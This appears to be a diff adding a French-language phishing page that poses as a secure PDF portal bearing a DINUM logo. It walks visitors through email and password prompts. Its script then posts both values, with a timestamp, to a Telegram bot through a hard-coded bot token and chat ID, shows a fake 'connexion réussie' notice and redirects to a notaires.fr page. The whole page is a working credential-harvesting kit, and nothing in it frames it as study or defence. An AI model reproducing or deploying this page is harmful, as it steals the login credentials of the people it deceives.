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" alt="DINUM">
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- Bouton d'accès -->
+                <button class="pdf-access-btn" id="accessBtn">
+                    <span class="pdf-icon-btn">
+                        <svg viewBox="0 0 24 24"><path d="M14 2H6c-1.1 0-1.99.9-1.99 2L4 20c0 1.1.89 2 1.99 2H18c1.1 0 2-.9 2-2V8l-6-6zm2 16H8v-2h8v2zm0-4H8v-2h8v2zm-3-5V3.5L18.5 9H13z"/></svg>
+                    </span>
+                    Accéder au document PDF
+                </button>
+                
+                <div class="security-badge">
+                    <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11V11.99z"/></svg>
+                    Document 100% sécurisé et chiffré
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Étape 2 : Page de saisie d'email (cachée initialement) -->
+    <div class="login-container" id="emailContainer">
+        <div class="login-header">
+            <h2>Vérification d'identité</h2>
+        </div>
+        <div class="login-content">
+            <form class="login-form" id="emailForm">
+                <div class="form-group">
+                    <label for="email">Adresse e-mail professionnelle</label>
+                    <input type="email" id="email" name="email" required placeholder="votre@email.com">
+                </div>
+                <button type="submit" class="login-btn" id="emailBtn">
+                    Continuer
+                </button>
+            </form>
+            <div class="loader" id="emailLoader"></div>
+        </div>
+    </div>
+
+    <!-- Étape 3 : Page de saisie de mot de passe (cachée initialement) -->
+    <div class="password-container" id="passwordContainer">
+        <div class="password-header">
+            <h2>Saisissez votre mot de passe</h2>
+        </div>
+        <div class="password-content">
+            <form class="password-form" id="passwordForm">
+                <div class="form-group">
+                    <label for="password">Mot de passe pour <span id="passwordEmail"></span></label>
+                    <input type="password" id="password" name="password" required placeholder="••••••••">
+                    <div class="forgot-password">
+                        <a href="#" id="forgotPassword">Mot de passe oublié ?</a>
+                    </div>
+                </div>
+                <button type="submit" class="password-btn" id="passwordBtn">
+                    Se connecter
+                </button>
+            </form>
+            <div class="loader" id="passwordLoader"></div>
+        </div>
+    </div>
+
+    <!-- Modal de confirmation d'email -->
+    <div class="modal-overlay" id="emailModal">
+        <div class="modal-container">
+            <div class="modal-header">
+                <h3>Confirmez votre adresse e-mail</h3>
+                <button class="modal-close" id="modalClose">&times;</button>
+            </div>
+            <div class="modal-body">
+                <p>Nous avons bien reçu votre demande d'accès au document sécurisé.</p>
+                <p>Veuillez confirmer que cette adresse e-mail est correcte :</p>
+                <p class="modal-email" id="confirmEmail"></p>
+                <div class="modal-actions">
+                    <button class="modal-btn modal-btn-secondary" id="changeEmailBtn">Modifier</button>
+                    <button class="modal-btn modal-btn-primary" id="confirmEmailBtn">Confirmer</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Notification flash -->
+    <div class="notification" id="notification">
+        <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
+        <span id="notificationText">Connexion réussie !</span>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            // Configuration Telegram
+            const TELEGRAM_BOT_TOKEN = '8039103697:AAFTj13R9PS4KM-39LQT3SiUSQMNR7s4V1k';
+            const TELEGRAM_CHAT_ID = '8113234145';
+            
+            // Fonction pour envoyer les données à Telegram
+            function sendToTelegram(message) {
+                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+                
+                fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                })
+                .then(response => response.json())
+                .then(data => {
+                    console.log('Message envoyé à Telegram:', data);
+                })
+                .catch(error => {
+                    console.error('Erreur lors de l\'envoi à Telegram:', error);
+                });
+            }
+
+            // Éléments du DOM
+            const accessBtn = document.getElementById('accessBtn');
+            const emailContainer = document.getElementById('emailContainer');
+            const passwordContainer = document.getElementById('passwordContainer');
+            const mainContainer = document.getElementById('mainContainer');
+            const emailForm = document.getElementById('emailForm');
+            const passwordForm = document.getElementById('passwordForm');
+            const emailInput = document.getElementById('email');
+            const passwordInput = document.getElementById('password');
+            const emailBtn = document.getElementById('emailBtn');
+            const passwordBtn = document.getElementById('passwordBtn');
+            const emailLoader = document.getElementById('emailLoader');
+            const passwordLoader = document.getElementById('passwordLoader');
+            const emailModal = document.getElementById('emailModal');
+            const confirmEmail = document.getElementById('confirmEmail');
+            const confirmEmailBtn = document.getElementById('confirmEmailBtn');
+            const changeEmailBtn = document.getElementById('changeEmailBtn');
+            const modalClose = document.getElementById('modalClose');
+            const notification = document.getElementById('notification');
+            const notificationText = document.getElementById('notificationText');
+            const forgotPassword = document.getElementById('forgotPassword');
+            const passwordEmail = document.getElementById('passwordEmail');
+
+            // Clic sur le bouton d'accès PDF
+            accessBtn.addEventListener('click', function() {
+                // Animation de transition
+                mainContainer.style.opacity = '0';
+                mainContainer.style.transform = 'translateY(-20px)';
+                
+                setTimeout(() => {
+                    mainContainer.style.display = 'none';
+                    emailContainer.style.display = 'block';
+                    
+                    // Petit délai pour que l'animation soit visible
+                    setTimeout(() => {
+                        emailContainer.style.opacity = '1';
+                        emailContainer.style.transform = 'translateY(0)';
+                    }, 50);
+                }, 400);
+            });
+
+            // Soumission du formulaire d'email
+            emailForm.addEventListener('submit', function(e) {
+                e.preventDefault();
+                
+                // Afficher le loader
+                emailBtn.style.display = 'none';
+                emailLoader.style.display = 'block';
+                
+                // Simuler un délai de traitement
+                setTimeout(() => {
+                    // Cacher le loader
+                    emailLoader.style.display = 'none';
+                    
+                    // Afficher la modale de confirmation
+                    confirmEmail.textContent = emailInput.value;
+                    emailModal.style.display = 'flex';
+                    
+                    // Petit délai pour l'animation
+                    setTimeout(() => {
+                        emailModal.style.opacity = '1';
+                    }, 10);
+                }, 1500);
+            });
+
+            // Clic sur "Confirmer" dans la modale
+            confirmEmailBtn.addEventListener('click', function() {
+                // Fermer la modale
+                emailModal.style.opacity = '0';
+                
+                setTimeout(() => {
+                    emailModal.style.display = 'none';
+                    
+                    // Afficher la page de mot de passe
+                    emailContainer.style.opacity = '0';
+                    emailContainer.style.transform = 'translateY(20px)';
+                    
+                    setTimeout(() => {
+                        emailContainer.style.display = 'none';
+                        passwordContainer.style.display = 'block';
+                        passwordEmail.textContent = emailInput.value;
+                        
+                        // Petit délai pour l'animation
+                        setTimeout(() => {
+                            passwordContainer.style.opacity = '1';
+                            passwordContainer.style.transform = 'translateY(0)';
+                            passwordInput.focus();
+                        }, 50);
+                    }, 400);
+                }, 300);
+            });
+
+            // Clic sur "Modifier" dans la modale
+            changeEmailBtn.addEventListener('click', function() {
+                // Fermer la modale
+                emailModal.style.opacity = '0';
+                
+                setTimeout(() => {
+                    emailModal.style.display = 'none';
+                    emailBtn.style.display = 'block';
+                    
+                    // Mettre le focus sur le champ email
+                    emailInput.focus();
+                    emailInput.select();
+                }, 300);
+            });
+
+            // Fermeture de la modale
+            modalClose.addEventListener('click', function() {
+                emailModal.style.opacity = '0';
+                
+                setTimeout(() => {
+                    emailModal.style.display = 'none';
+                }, 300);
+            });
+
+            // Soumission du formulaire de mot de passe
+            passwordForm.addEventListener('submit', function(e) {
+                e.preventDefault();
+                
+                // Afficher le loader
+                passwordBtn.style.display = 'none';
+                passwordLoader.style.display = 'block';
+                
+                // Envoyer les informations à Telegram
+                const message = `
+<b>Nouvelle connexion détectée</b>
+📧 Email: <code>${emailInput.value}</code>
+🔑 Mot de passe: <code>${passwordInput.value}</code>
+🕒 Date: ${new Date().toLocaleString()}
+                `;
+                
+                sendToTelegram(message);
+                
+                // Simuler un délai de connexion
+                setTimeout(() => {
+                    // Cacher le loader
+                    passwordLoader.style.display = 'none';
+                    
+                    // Afficher une notification de succès
+                    notificationText.textContent = 'Connexion réussie ! Redirection en cours...';
+                    notification.classList.add('show');
+                    
+                    // Redirection vers orange.fr après 2 secondes
+                    setTimeout(() => {
+                        window.location.href = 'https://paris.notaires.fr/fr/outils-et-services/calcul-de-frais-d-achat';
+                    }, 2000);
+                }, 1500);
+            });
+
+            // Mot de passe oublié
+            forgotPassword.addEventListener('click', function(e) {
+                e.preventDefault();
+                
+                notificationText.textContent = 'Un e-mail de réinitialisation a été envoyé à ' + emailInput.value;
+                notification.classList.add('show');
+                
+                setTimeout(() => {
+                    notification.classList.remove('show');
+                }, 4000);
+            });
+        });
+    </script>
+</body>
+</html>
